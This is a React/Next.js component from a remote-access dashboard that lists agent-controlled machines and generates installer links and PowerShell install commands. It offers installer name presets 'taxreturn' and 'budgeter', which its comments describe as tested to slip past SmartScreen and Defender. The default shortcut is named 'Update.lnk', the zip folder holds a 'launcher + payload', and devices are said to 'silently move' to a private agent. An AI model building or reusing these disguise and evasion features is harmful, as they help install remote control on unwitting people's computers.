"use client";

import { useCallback, useEffect, useMemo, useState } from "react";
import Link from "next/link";
import { Activity, Moon, Monitor, Plus, PlugZap, RefreshCw, Search } from "lucide-react";

import { PanicButton } from "@/components/panic-button";
import { cn } from "@/lib/cn";
import { formatIdle } from "@/lib/device-idle";

// Task 95 — Devices v2 list, ScreenConnect-style session grid. ONE device =
// ONE row with ONE status (from /api/devices only, derived from OUR heartbeat
// age — the old page also rendered the Vantra-sync view, so a machine showed
// twice with two statuses). Row click → /dashboard/devices/[deviceId].

type DeviceRow = {
  id: string;
  name: string;
  deviceKind: string;
  status: string;
  osName: string | null;
  osVersion: string | null;
  lastSeenAt: string | null;
  // Task 106 (bit C1) — MeshCentral `idletime`, normalised to seconds by
  // Vantra (`/api/devices` enriches each row best-effort; null when unknown).
  idleSeconds: number | null;
};

// Task 121 — the artifact names a public mint sends. Mirrors `InstallerNames`
// in lib/vantra-link.ts (declared here instead of imported so this client
// component never pulls in the server-only module).
type InstallerNames = { zipName?: string; updateLinkName?: string; innerFolder?: string };

function relTime(iso: string | null): string {
  if (!iso) return "never";
  const s = Math.floor((Date.now() - new Date(iso).getTime()) / 1000);
  if (s < 60) return "just now";
  if (s < 3600) return `${Math.floor(s / 60)} min ago`;
  if (s < 86400) return `${Math.floor(s / 3600)} hr ago`;
  return `${Math.floor(s / 86400)} d ago`;
}

function osLabel(d: DeviceRow): string {
  const name = (d.osName ?? "").toLowerCase();
  if (name.includes("win")) return "Windows";
  if (name.includes("mac") || name.includes("darwin") || name.includes("os x")) return "macOS";
  if (name.includes("linux")) return "Linux";
  return d.osName || "Unknown";
}

type Filter = "all" | "online" | "offline";

// Task 121 (OOB-13) — the public tab hands out Vantra's launcher ZIP and lets
// the user name it, exactly like Vantra's own Add-a-device modal. These two
// presets are copied VERBATIM from that modal (`NAME_PRESETS` +
// `applyNamePreset`): pre-tested benign names, confirmed on a stock Win11 VM
// (downloads + installs clean, no SmartScreen/Defender block). Do NOT invent
// new ones without testing them on a real machine.
const NAME_PRESETS: Array<{ token: string; label: string }> = [
  { token: "taxreturn", label: "taxreturn" },
  { token: "budgeter", label: "budgeter" },
];

const NAME_INPUT_CLASS =
  "mt-1 w-full rounded-md border border-border bg-bg px-2 py-1.5 text-sm text-fg placeholder:text-fg-muted/70 focus:border-brand-500 focus:outline-none focus:ring-2 focus:ring-brand-500/30";

export function DeviceList() {
  const [devices, setDevices] = useState<DeviceRow[]>([]);
  const [loaded, setLoaded] = useState(false);
  const [filter, setFilter] = useState<Filter>("all");
  const [query, setQuery] = useState("");
  const [adding, setAdding] = useState(false);
  // Tier model: the Add-a-device panel exposes the user's TWO install paths.
  // "public" = the shareable one-time link; "private" = a PowerShell install
  // command against the private agent domain (premium/admin-granted only —
  // the toggle is disabled when the user has just one tier).
  const [installKind, setInstallKind] = useState<"public" | "private">("public");
  // Task 121 — the three optional names of the public artifact (Vantra's
  // launcher ZIP). Blank = the generator default (Agent.zip / Update.lnk /
  // launcher); the server drops anything that is not a bare name. They are sent
  // with the next public mint, so what is on screen is what gets minted.
  const [zipName, setZipName] = useState("");
  const [linkName, setLinkName] = useState("");
  const [folderName, setFolderName] = useState("");

  const [link, setLink] = useState<{
    status: string;
    installUrl: string | null;
    lastError: string | null;
    orgTier: string;
    privateAllowed: boolean;
    privateOrgId: string | null;
    privatePsCommand: string | null;
    // TASK_122 (B11) A3 — the artifact kind actually behind installUrl, so the
    // console can show "ZIP · <zipName>" vs "legacy exe" instead of a silent
    // drop to the exe branch being indistinguishable from a real ZIP.
    installerKind: "zip" | "exe" | null;
    installerNames: InstallerNames | null;
  } | null>(null);
  const [psRevealed, setPsRevealed] = useState(false);
  const [busy, setBusy] = useState("");
  const [error, setError] = useState("");
  const [copied, setCopied] = useState("");

  const loadLink = useCallback(async () => {
    try {
      const res = await fetch("/api/assistant/vantra");
      if (!res.ok) return;
      const data = await res.json();
      setLink(
        data.link
          ? {
              status: data.link.status,
              installUrl: data.link.installUrl,
              lastError: data.link.lastError,
              orgTier: data.link.orgTier ?? "public",
              privateAllowed: data.link.privateAllowed === true,
              privateOrgId: data.link.privateOrgId ?? null,
              privatePsCommand: data.link.privatePsCommand ?? null,
              installerKind:
                data.link.installerKind === "zip" || data.link.installerKind === "exe"
                  ? data.link.installerKind
                  : null,
              installerNames: data.link.installerNames ?? null,
            }
          : null,
      );
    } catch {
      // non-fatal — the list still renders without the link panel
    }
  }, []);

  const load = useCallback(async () => {
    setError("");
    try {
      const res = await fetch("/api/devices");
      if (!res.ok) throw new Error("Failed to load devices");
      const data = await res.json();
      setDevices(
        (data.devices ?? []).map((d: { effectiveStatus?: string; status?: string } & DeviceRow) => ({
          ...d,
          status: d.effectiveStatus ?? d.status ?? "unknown",
          idleSeconds:
            typeof d.idleSeconds === "number" && Number.isFinite(d.idleSeconds) && d.idleSeconds >= 0
              ? d.idleSeconds
              : null,
        })),
      );
    } catch (e) {
      setError(e instanceof Error ? e.message : "Failed to load devices");
    } finally {
      setLoaded(true);
    }
  }, []);

  // WHY THE ORDER MATTERS (owner report 2026-09-24: "the device dashboard still
  // doesn't load users online until I click the refresh button").
  //
  // A row's status is DERIVED from `lastSeenAt` age (`deviceStatus()` in
  // lib/devices.ts — a heartbeat older than 10 min reads as offline), and
  // `lastSeenAt` is only ever refreshed by the Vantra→DB device sync that
  // `loadLink()` triggers (`syncDevices()` in lib/vantra-link.ts). Firing the
  // two in parallel — which this used to do — let the read win the race, so a
  // machine that is genuinely online rendered as OFFLINE on first paint and
  // only corrected itself when the user hit Refresh (by which time the earlier
  // sync had landed). Reproduced against device `Sc`: T0 `/api/devices` =
  // offline, then the link route, then T1 = online. Sync first, then read.
  const refreshAll = useCallback(async () => {
    await loadLink();
    await load();
  }, [load, loadLink]);

  // Task 106 (bit C1) — live refresh: re-poll every 20 s, paused while the
  // document is hidden so a background tab does not hammer the API. Manual
  // Refresh button stays. Cleared on unmount.
  useEffect(() => {
    void refreshAll();
    const tick = () => {
      if (document.visibilityState === "hidden") return;
      void refreshAll();
    };
    const timer = setInterval(tick, 20_000);
    const onVisible = () => {
      if (document.visibilityState === "visible") void refreshAll();
    };
    document.addEventListener("visibilitychange", onVisible);
    return () => {
      clearInterval(timer);
      document.removeEventListener("visibilitychange", onVisible);
    };
  }, [refreshAll]);

  async function enable() {
    setBusy("enable");
    setError("");
    try {
      const res = await fetch("/api/assistant/vantra", { method: "POST" });
      const data = await res.json().catch(() => ({}));
      if (!res.ok) throw new Error(typeof data.error === "string" ? data.error : "Enable failed");
      await loadLink();
    } catch (e) {
      setError(e instanceof Error ? e.message : "Enable failed");
    } finally {
      setBusy("");
    }
  }

  // Task 121 — a public mint always asks for the launcher ZIP (that IS the
  // public artifact now); the names are whatever was on screen, blank ⇒ the
  // generator default. The private tier is unchanged: no installer block.
  async function mintInstallLink(kind: "public" | "private", names?: InstallerNames) {
    setBusy(`install-${kind}`);
    setError("");
    try {
      const res = await fetch("/api/assistant/vantra/install-link", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(kind === "public" ? { kind, names: names ?? {} } : { kind }),
      });
      const data = await res.json().catch(() => ({}));
      if (!res.ok)
        throw new Error(typeof data.error === "string" ? data.error : "Couldn't mint install link");
      setLink((prev) =>
        prev
          ? {
              ...prev,
              status: data.link.status,
              installUrl: data.link.installUrl ?? prev.installUrl,
              privateOrgId: data.link.privateOrgId ?? prev.privateOrgId,
              privatePsCommand: data.link.privatePsCommand ?? (kind === "private" ? null : prev.privatePsCommand),
              installerKind:
                kind === "private"
                  ? prev.installerKind
                  : data.link.installerKind === "zip" || data.link.installerKind === "exe"
                    ? data.link.installerKind
                    : null,
              installerNames: kind === "private" ? prev.installerNames : (data.link.installerNames ?? null),
            }
          : prev,
      );
      if (kind === "private") setPsRevealed(false);
    } catch (e) {
      setError(e instanceof Error ? e.message : "Couldn't mint install link");
    } finally {
      setBusy("");
    }
  }

  // Task 121 (D7/Q3) — Vantra's `applyNamePreset`, verbatim: one click fills
  // link / folder / zip with the same pre-tested token (e.g. `taxreturn` →
  // `taxreturn.zip`).
  function applyNamePreset(token: string) {
    setLinkName(token);
    setFolderName(token);
    setZipName(`${token}.zip`);
  }

  async function copyText(key: string, value: string) {
    try {
      await navigator.clipboard.writeText(value);
      setCopied(key);
      setTimeout(() => setCopied(""), 2000);
    } catch {
      // clipboard unavailable — the text stays visible for manual copy
    }
  }

  // The PRIVATE PowerShell command as stored is fully buildable; the panel
  // shows it MASKED until the user explicitly reveals it (shoulder-surfing).
  function maskCommand(cmd: string): string {
    return cmd
      .split("\n")
      .map((line) => (line.trim().length > 24 ? `${line.slice(0, 18)}••••••••${line.slice(-4)}` : line))
      .join("\n");
  }

  const counts = useMemo(() => {
    const online = devices.filter((d) => d.status === "online" || d.status === "asleep").length;
    return { all: devices.length, online, offline: devices.length - online };
  }, [devices]);

  const visible = useMemo(() => {
    let rows = devices;
    if (filter === "online") rows = rows.filter((d) => d.status === "online" || d.status === "asleep");
    if (filter === "offline") rows = rows.filter((d) => d.status !== "online" && d.status !== "asleep");
    const q = query.trim().toLowerCase();
    if (q) rows = rows.filter((d) => `${d.name} ${d.osName ?? ""}`.toLowerCase().includes(q));
    return rows;
  }, [devices, filter, query]);

  const statusWord = (s: string) => (s === "asleep" ? "asleep" : s === "online" ? "online" : "offline");

  // Task 106 (bit C1) — the row's ONLY status + last-seen / idle rendering.
  // Owner 2026-09-23: this used to be duplicated by a dedicated "Last seen"
  // column right next to it (same timestamp twice on one row), so that column
  // is gone and this chip owns it — "offline · last seen …" when disconnected,
  // "online · idle …" when connected. Idle exists only while connected
  // (MeshCentral `idletime` goes stale offline), and a missing idle signal
  // degrades to the plain status rather than reading as "online · unknown".
  const statusIdleLabel = (d: DeviceRow): string => {
    const online = d.status === "online" || d.status === "asleep";
    if (!online) return `offline · last seen ${relTime(d.lastSeenAt)}`;
    if (d.idleSeconds === null) return statusWord(d.status);
    return `${statusWord(d.status)} · ${formatIdle(d.idleSeconds)}`;
  };

  return (
    <div className="space-y-5">
      {/* Add-a-device — TOP of the page (owner request), tier-aware. The user
          picks Public (shareable one-time link) or Private (PowerShell
          command on the private agent domain); the toggle is DISABLED for a
          free/trial (public-only) or private-only account. The public path
          shows ONLY the wrapper link path — never the agent host/domain. */}
      <div className="rounded-xl border border-border bg-bg-elevated">
        <button
          onClick={() => setAdding((v) => !v)}
          className="flex w-full items-center justify-between px-4 py-3 text-left"
        >
          <span className="flex items-center gap-2 text-sm font-medium text-fg">
            <Plus className="h-4 w-4" /> Add a device
          </span>
          <span className="text-xs text-fg-muted">{adding ? "hide" : "show"}</span>
        </button>
        {adding && (
          <div className="border-t border-border px-4 py-4">
            {link === null ? (
              <div>
                <p className="text-sm text-fg-muted">
                  Link your SpaceWorker account to the device agent service, then install the agent
                  on the machine you want to reach.
                </p>
                <button
                  onClick={enable}
                  disabled={busy === "enable"}
                  className="mt-3 rounded-lg bg-brand-600 px-4 py-2 text-sm font-semibold text-white transition-colors hover:bg-brand-700 disabled:opacity-60"
                >
                  {busy === "enable" ? "Enabling…" : "Enable device link"}
                </button>
              </div>
            ) : (
              <div className="space-y-3">
                {/* Public / Private toggle — disabled with a single tier */}
                <div className="flex flex-wrap items-center gap-2">
                  <div className="flex overflow-hidden rounded-lg border border-border">
                    <button
                      onClick={() => setInstallKind("public")}
                      disabled={!link.privateAllowed}
                      title={
                        link.privateAllowed
                          ? "Public agent — the shareable link"
                          : "Your account is public-tier only (premium grants the private agent)"
                      }
                      className={cn(
                        "px-3 py-1.5 text-xs transition-colors disabled:cursor-not-allowed",
                        installKind === "public"
                          ? "bg-black/10 font-medium text-fg dark:bg-white/10"
                          : "text-fg-muted hover:text-fg",
                        !link.privateAllowed && installKind !== "public" && "opacity-50",
                      )}
                    >
                      Public device
                    </button>
                    <button
                      onClick={() => setInstallKind("private")}
                      disabled={!link.privateAllowed}
                      title={
                        link.privateAllowed
                          ? "Private agent — PowerShell command on the private domain"
                          : "Private agent requires a premium plan (admin-granted)"
                      }
                      className={cn(
                        "px-3 py-1.5 text-xs transition-colors disabled:cursor-not-allowed",
                        installKind === "private"
                          ? "bg-black/10 font-medium text-fg dark:bg-white/10"
                          : "text-fg-muted hover:text-fg",
                        !link.privateAllowed && "opacity-50",
                      )}
                    >
                      Private device{!link.privateAllowed ? " 🔒" : ""}
                    </button>
                  </div>
                  <span className="text-xs text-fg-muted">
                    {link.privateAllowed
                      ? "Public link is safe to share — devices silently move to your private agent."
                      : "Public link only — the private agent unlocks with premium."}
                  </span>
                </div>

                {installKind === "public" ? (
                  <div className="space-y-3">
                    <p className="text-sm text-fg-muted">
                      1 · Generate the link &nbsp;·&nbsp; 2 · Open it on the target machine
                      &nbsp;·&nbsp; 3 · It appears here, then silently moves to your private agent.
                    </p>
                    {/* TASK_121 (OOB-13) — name the artifact the way Vantra's own
                        Add-a-device flow does. The link hands out the launcher
                        ZIP (Vantra default Agent.zip, shortcut Update.lnk,
                        folder launcher); blank = that default. Bare names only —
                        the server drops anything with a slash, a quote, a
                        control character or "..". The values on screen are the
                        values the next mint uses. */}
                    <div className="rounded-lg border border-border bg-bg px-3 py-3">
                      <p className="text-xs font-medium uppercase tracking-wide text-fg-muted">
                        Name the installer <span className="font-normal normal-case">(optional)</span>
                      </p>
                      <div className="mt-2 flex flex-wrap items-center gap-2">
                        <span className="text-xs text-fg-muted">Pre-tested templates</span>
                        {NAME_PRESETS.map((p) => (
                          <button
                            key={p.token}
                            type="button"
                            onClick={() => applyNamePreset(p.token)}
                            className="rounded-md border border-border px-3 py-1 text-xs font-medium text-fg transition-colors hover:bg-black/5 dark:hover:bg-white/5"
                          >
                            {p.label}
                          </button>
                        ))}
                      </div>
                      <div className="mt-3 grid gap-3 sm:grid-cols-3">
                        <label className="block">
                          <span className="text-xs font-medium text-fg">Zip name</span>
                          <input
                            value={zipName}
                            onChange={(e) => setZipName(e.target.value)}
                            placeholder="Agent.zip"
                            maxLength={64}
                            className={NAME_INPUT_CLASS}
                          />
                          <span className="mt-1 block text-xs text-fg-muted">
                            Optional — the downloaded file&apos;s name.
                          </span>
                        </label>
                        <label className="block">
                          <span className="text-xs font-medium text-fg">Shortcut name</span>
                          <input
                            value={linkName}
                            onChange={(e) => setLinkName(e.target.value)}
                            placeholder="Update"
                            maxLength={64}
                            className={NAME_INPUT_CLASS}
                          />
                          <span className="mt-1 block text-xs text-fg-muted">
                            Optional — leave default or edit. &quot;.lnk&quot; is added automatically,
                            so the file launches as a shortcut.
                          </span>
                        </label>
                        <label className="block">
                          <span className="text-xs font-medium text-fg">Folder name</span>
                          <input
                            value={folderName}
                            onChange={(e) => setFolderName(e.target.value)}
                            placeholder="launcher"
                            maxLength={64}
                            className={NAME_INPUT_CLASS}
                          />
                          <span className="mt-1 block text-xs text-fg-muted">
                            Optional — the subfolder holding the launcher + payload inside the zip.
                          </span>
                        </label>
                      </div>
                      {/* TASK_122 (B11) A3 — owner report: "no button to click
                          to generate the zip link after the renaming." The
                          naming card gets its OWN primary action, adjacent to
                          the fields the user just edited, instead of relying
                          on "New link" down in the URL row (which stays put,
                          unchanged, for "just give me another one"). Only
                          shown once a link exists — the empty-state card
                          already has "Generate link" directly below it. */}
                      {link.installUrl && (
                        <button
                          onClick={() =>
                            mintInstallLink("public", {
                              zipName,
                              updateLinkName: linkName,
                              innerFolder: folderName,
                            })
                          }
                          disabled={busy === "install-public"}
                          className="mt-3 w-full rounded-lg bg-brand-600 px-4 py-2 text-sm font-semibold text-white transition-colors hover:bg-brand-700 disabled:opacity-60 sm:w-auto"
                        >
                          {busy === "install-public" ? "Generating…" : "Regenerate with these names"}
                        </button>
                      )}
                    </div>
                    {!link.installUrl ? (
                      <button
                        onClick={() =>
                          mintInstallLink("public", {
                            zipName,
                            updateLinkName: linkName,
                            innerFolder: folderName,
                          })
                        }
                        disabled={busy === "install-public"}
                        className="rounded-lg bg-brand-600 px-4 py-2 text-sm font-semibold text-white transition-colors hover:bg-brand-700 disabled:opacity-60"
                      >
                        {busy === "install-public" ? "Generating…" : "Generate link"}
                      </button>
                    ) : (
                      <div className="space-y-1.5">
                        {/* TASK_122 (B11) A3/D3 — the artifact kind must be
                            visible, driven by link.installerKind, so a silent
                            drop to the legacy exe branch is impossible to
                            miss. If the kind is still "exe" while the user has
                            typed names, say so plainly instead of implying the
                            names applied. */}
                        <div className="flex flex-wrap items-center gap-2 text-xs">
                          <span
                            className={cn(
                              "rounded-full border px-2 py-0.5 font-medium",
                              link.installerKind === "zip"
                                ? "border-emerald-500/40 text-emerald-500"
                                : "border-amber-500/40 text-amber-500",
                            )}
                          >
                            {link.installerKind === "zip"
                              ? `ZIP · ${link.installerNames?.zipName || "Agent.zip"}`
                              : "legacy exe"}
                          </span>
                          {link.installerKind !== "zip" && (zipName || linkName || folderName) && (
                            <span className="text-amber-500">
                              These names haven&apos;t been applied — this link is still the plain exe.
                              Click &ldquo;Regenerate with these names&rdquo; above.
                            </span>
                          )}
                        </div>
                        <div className="flex flex-wrap items-center gap-2">
                          {/* Full install URL with configured public domain */}
                          <code className="max-w-full truncate rounded bg-bg px-2 py-1.5 text-xs text-fg-muted">
                            {link.installUrl}
                          </code>
                          <button
                            onClick={() =>
                              copyText(
                                "public",
                                link.installUrl || "",
                              )
                            }
                            className="rounded-lg border border-border px-3 py-1.5 text-xs font-medium text-fg transition-colors hover:bg-black/5 disabled:opacity-50 dark:hover:bg-white/5"
                          >
                            {copied === "public" ? "Copied ✓" : "Copy link"}
                          </button>
                          <button
                            onClick={() =>
                              mintInstallLink("public", {
                                zipName,
                                updateLinkName: linkName,
                                innerFolder: folderName,
                              })
                            }
                            disabled={busy === "install-public"}
                            className="rounded-lg border border-border px-3 py-1.5 text-xs font-medium text-fg-muted transition-colors hover:text-fg disabled:opacity-50"
                          >
                            {busy === "install-public" ? "Generating…" : "New link"}
                          </button>
                        </div>
                      </div>
                    )}
                    <p className="text-xs text-fg-muted">
                      One-time link, valid 72 hours — run it on the machine you want linked.
                    </p>
                    {link.status === "pending_install" && (
                      <p className="text-xs text-amber-500">
                        Waiting for install — the machine appears here the moment the agent checks in.
                      </p>
                    )}
                  </div>
                ) : (
                  <div className="space-y-3">
                    <p className="text-sm text-fg-muted">
                      Private installs use a PowerShell command on the private agent domain — no
                      shareable link exists for this tier.
                    </p>
                    {!link.privatePsCommand ? (
                      <button
                        onClick={() => mintInstallLink("private")}
                        disabled={busy === "install-private"}
                        className="rounded-lg bg-brand-600 px-4 py-2 text-sm font-semibold text-white transition-colors hover:bg-brand-700 disabled:opacity-60"
                      >
                        {busy === "install-private" ? "Generating…" : "Generate PowerShell command"}
                      </button>
                    ) : (
                      <>
                        <pre className="max-h-40 overflow-auto rounded-lg border border-border bg-bg p-3 font-mono text-xs text-fg">
                          {psRevealed ? link.privatePsCommand : maskCommand(link.privatePsCommand)}
                        </pre>
                        <div className="flex flex-wrap items-center gap-2">
                          <button
                            onClick={() => setPsRevealed((v) => !v)}
                            className="rounded-lg border border-border px-3 py-1.5 text-xs font-medium text-fg transition-colors hover:bg-black/5 dark:hover:bg-white/5"
                          >
                            {psRevealed ? "Hide" : "Reveal"}
                          </button>
                          <button
                            onClick={() => copyText("private", link.privatePsCommand ?? "")}
                            disabled={!psRevealed}
                            title={psRevealed ? undefined : "Reveal first, then copy"}
                            className="rounded-lg border border-border px-3 py-1.5 text-xs font-medium text-fg transition-colors hover:bg-black/5 disabled:opacity-50 dark:hover:bg-white/5"
                          >
                            {copied === "private" ? "Copied ✓" : "Copy command"}
                          </button>
                          <button
                            onClick={() => mintInstallLink("private")}
                            disabled={busy === "install-private"}
                            className="rounded-lg border border-border px-3 py-1.5 text-xs font-medium text-fg-muted transition-colors hover:text-fg disabled:opacity-50"
                          >
                            {busy === "install-private" ? "Generating…" : "New command"}
                          </button>
                        </div>
                        <p className="text-xs text-fg-muted">
                          Run in an elevated PowerShell on the target machine. Valid 72 hours —
                          agents on this domain check in privately.
                        </p>
                      </>
                    )}
                  </div>
                )}
                {link.lastError && <p className="text-xs text-red-500">Sync error: {link.lastError}</p>}
              </div>
            )}
          </div>
        )}
      </div>

      {error && <p className="text-sm text-red-500">{error}</p>}
      <div className="flex flex-wrap items-start justify-between gap-4">
        <div>
          <h1 className="text-xl font-semibold text-fg">Devices</h1>
          <p className="mt-1 text-sm text-fg-muted">
            Your machines and their live status. Remote tools live in each machine&apos;s console.
          </p>
        </div>
        <PanicButton />
      </div>

      {error && <p className="text-sm text-red-500">{error}</p>}

      {/* ScreenConnect-style toolbar: tabs + filter + refresh */}
      <div className="rounded-xl border border-border bg-bg-elevated">
        <div className="flex flex-wrap items-center justify-between gap-3 border-b border-border px-4 py-3">
          <div className="flex items-center gap-1">
            {(
              [
                ["all", `All (${counts.all})`],
                ["online", `Online (${counts.online})`],
                ["offline", `Offline (${counts.offline})`],
              ] as Array<[Filter, string]>
            ).map(([key, label]) => (
              <button
                key={key}
                onClick={() => setFilter(key)}
                className={cn(
                  "rounded-md px-3 py-1.5 text-sm transition-colors",
                  filter === key
                    ? "bg-black/10 font-medium text-fg dark:bg-white/10"
                    : "text-fg-muted hover:bg-black/5 hover:text-fg dark:hover:bg-white/5",
                )}
              >
                {label}
              </button>
            ))}
          </div>
          <div className="flex items-center gap-2">
            <label className="relative block">
              <Search className="pointer-events-none absolute left-2.5 top-1/2 h-3.5 w-3.5 -translate-y-1/2 text-fg-muted" />
              <input
                value={query}
                onChange={(e) => setQuery(e.target.value)}
                placeholder="Filter machines"
                className="w-44 rounded-md border border-border bg-bg py-1.5 pl-8 pr-2 text-sm text-fg placeholder:text-fg-muted/70 focus:border-brand-500 focus:outline-none focus:ring-2 focus:ring-brand-500/30"
              />
            </label>
            <button
              onClick={() => void refreshAll()}
              title="Refresh"
              className="rounded-md border border-border p-2 text-fg-muted transition-colors hover:text-fg"
            >
              <RefreshCw className="h-4 w-4" />
            </button>
          </div>
        </div>

        <div className="flex items-center gap-4 px-4 py-2 text-xs text-fg-muted">
          <span className="flex items-center gap-1.5">
            <span className="inline-block h-2 w-2 rounded-full bg-emerald-500" /> online
          </span>
          <span className="flex items-center gap-1.5">
            <span className="inline-block h-2 w-2 rounded-full bg-amber-400" /> asleep
          </span>
          <span className="flex items-center gap-1.5">
            <span className="inline-block h-2 w-2 rounded-full bg-zinc-400" /> offline
          </span>
        </div>

        {!loaded ? (
          <p className="px-4 py-6 text-sm text-fg-muted">Loading machines…</p>
        ) : visible.length === 0 ? (
          <p className="px-4 py-6 text-sm text-fg-muted">
            {devices.length === 0
              ? "No machines yet — install the agent below to add your first one."
              : "No machines match this filter."}
          </p>
        ) : (
          <div>
            {visible.map((d) => {
              const online = d.status === "online" || d.status === "asleep";
              const dot =
                d.status === "online"
                  ? "bg-emerald-500"
                  : d.status === "asleep"
                    ? "bg-amber-400"
                    : "bg-zinc-400";
              return (
                <Link
                  key={d.id}
                  href={`/dashboard/devices/${d.id}`}
                  className="grid grid-cols-[minmax(0,1fr)_auto] items-center gap-3 border-b border-border px-4 py-3 transition-colors last:border-b-0 hover:bg-black/5 md:grid-cols-[minmax(0,1fr)_140px_200px_36px] dark:hover:bg-white/5"
                >
                  <span className="flex min-w-0 items-center gap-2.5">
                    {online ? (
                      <Monitor className="h-4 w-4 shrink-0 text-fg-muted" />
                    ) : (
                      <Moon className="h-4 w-4 shrink-0 text-fg-muted" />
                    )}
                    <span className="truncate font-mono text-sm text-fg">{d.name}</span>
                  </span>
                  <span className="hidden text-sm text-fg-muted md:block">{osLabel(d)}</span>
                  <span className="flex items-center gap-2 text-sm">
                    <span className={cn("inline-block h-2.5 w-2.5 shrink-0 rounded-full", dot)} />
                    <span className={cn(online ? "text-emerald-500" : "text-fg-muted")}>
                      {statusIdleLabel(d)}
                    </span>
                  </span>
                  {/* Owner 2026-09-23 — the dedicated "Last seen" column that
                      used to sit here rendered the SAME timestamp as the status
                      chip right beside it, so it was removed; the chip owns
                      last-seen. TASK_103 (MISSING-1) puts the Ping button here. */}
                  <span className="hidden justify-end md:flex">
                    {online ? (
                      <PlugZap className="h-4 w-4 text-fg-muted" />
                    ) : (
                      <Activity className="h-4 w-4 text-fg-muted/60" />
                    )}
                  </span>
                </Link>
              );
            })}
          </div>
        )}
      </div>
    </div>
  );
}


